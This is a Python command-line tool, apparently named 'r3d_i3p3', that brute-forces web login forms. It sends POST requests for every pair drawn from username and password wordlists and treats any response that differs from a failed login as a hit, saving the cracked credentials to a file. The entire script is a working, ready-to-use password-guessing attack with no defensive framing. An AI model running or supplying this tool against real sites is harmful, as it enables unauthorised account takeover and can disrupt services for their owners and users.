#!/usr/bin/python
import sys, getopt
import requests
#import hashlib

############################################################
#Variables 
url =""
user_option = ""
password_option =""
verbose_mode = False
username_wordlist =""
password_wordlist =""
output = ""
testall = False
############################################################
"""
	print progress bar on console-line
	arguments 
	count 	: Number of actions taken 
	total 	: The total value of actions
	status 	: Status message to print 
"""
def progress(count, total, status=''):
	bar_len = 60
	filled_len = int(round(bar_len * count / float(total)))

	percents = round(100.0 * count / float(total), 1)
	bar = '=' * filled_len + '-' * (bar_len - filled_len)

	sys.stdout.write('[%s] %s%s ...%s\r' % (bar, percents, '%', status))
	sys.stdout.flush()
############################################################
"""
"""
def printStartMessage():
	print("---------------------------------------------------------------------")
	print("				r3d_i3p3		")
	print("			Brutforce POST request		")
	print("----------------------------------------------------------------------")

############################################################
"""
	Help message
"""
def printHelp():
	print("usage : ")
	print("brutforce_post.py -l <url> -u <user_post_option> -p <password_post_option> -s <username wordlist> -a <password wordlist> -v")
	print("\t-h\t\t--help\t\t\t\tTo print this message.")
	print("\t-l\t\t--url\t\t\t\tweb page (ex : -l http://test.com/login.php).")
	print("\t-u\t\t--user_option\t\t\tusername input name on form (ex: -u user).")
	print("\t-p\t\t--pass_option\t\t\tpassword input name on form (ex: -p pass).")
	print("\t-s\t\t--username_wordlist\t\ttfile with usernames to test (ex: -s /usr/share/wordlists/metasploit/http_default_users.txt.")
	print("\t-a\t\t--password_wordlist\t\tfile with passwords to test (ex: -a /usr/share/wordlists/metasploit/http_default_pass.txt.")
	print("\t-v\t\t--verbose\t\t\tto active verbose mode (show evrey tentative).")
	print("\t-t\t\t--testall\t\t\tto test all, without stop after a correcte user,pass.")
	print("\t-o\t\t--output\t\t\tfile to save correct user,pass.")
############################################################
"""
	Attack function	
"""
def attack():
	#count attempts 
	c_test = 0 
	#load username and password wordlists 
	username_wordlist_file = open(username_wordlist,"r")
	password_wordlist_file = open(password_wordlist,"r")
	usernames = username_wordlist_file.readlines()
	passwords = password_wordlist_file.readlines()
	username_wordlist_file.close()
	password_wordlist_file.close()
	#count nbr of usernames to test 
	m_user = len(usernames)
	print("usernames wordlist " + username_wordlist + " with " + str(m_user) +" usernames" ) 
	#count nbr of passwords
	m_pass = len(passwords)
	print("usernames wordlist " + password_wordlist + " with " + str(m_pass) +" passwords" )
	if(output !=""):
		#create output file
		output_file = open(output, "a")
	#prepare error response to check/compare
	error_content = requests.post(url,{str(user_option):"adadadadadadad",str(password_option):"adada"})
	#print(hashlib.md5(str(error_content.content).encode()).hexdigest() )
	print("starting ....")
	for username in usernames:
		for password in passwords:
			#sending POST request
			response = requests.post(url,{str(user_option):str(username[0:-1]),str(password_option):str(password[0:-1])})
			#check
			if(response.content == error_content.content):
				c_test += 1 
				if(verbose_mode):
					print("USERNAME:"+username[0:-1]+"      PASSWORD:"+password[0:-1] + " CODE : " +str(response.status_code))
			else:
				print("ERICAAAAAAAAAAAAAA !!!!!!!!!!!! LOGIN DONE")
				print(" : USERNAME:"+username[0:-1]+"      PASSWORD:"+password[0:-1] + " CODE : " +str(response.status_code))
				if(output !=""):
					output_file.write(username[0:-1] +":"+password[0:-1])
				if(testall == False):
					sys.exit(1)
		#show progress bar
		progress(c_test, m_user*m_pass, status='username :' + username)
		#endFor
	#endFor
	print("good bye :-")
############################################################	

#main
try:
	printStartMessage()
	#loading args
	opts, args = getopt.getopt(sys.argv[1:], 'thvl:u:p:s:a:o:', ['testall','help', 'verbose', "url=","user_option=","pass_option=","username_wordlist=","password_wordlist=","output="])
except getopt.GetoptError as err:
	print(err)
	printHelp()
	sys.exit(2)
except:
	print("err")
	sys.exit(2)
#config var
for opt, arg in opts:
	if opt in ("-h", "--help"):
		printHelp()
		sys.exit(1)
	elif opt in ("-v", "--verbose"):
		verbose_mode = True
	elif opt in ("-l", "--url"):
		url = arg
	elif opt in ("-u", "--user_option"):
		user_option = arg
	elif opt in ("-p", "--password_option"):
		password_option = arg
	elif opt in ("-s", "--username_wordlist"):
		username_wordlist = arg
	elif opt in ("-a", "--password_wordlist"):
		password_wordlist = arg
	elif opt in ("-o", "--output"):
		output = arg
	elif opt in ("-t", "--testall"):
		testall = True
#check for args
if(len(sys.argv[1:]) < 5):
	print(getopt.GetoptError("incomplete command"))
	printHelp()
	sys.exit(2)
#starting brutforce
attack()
	
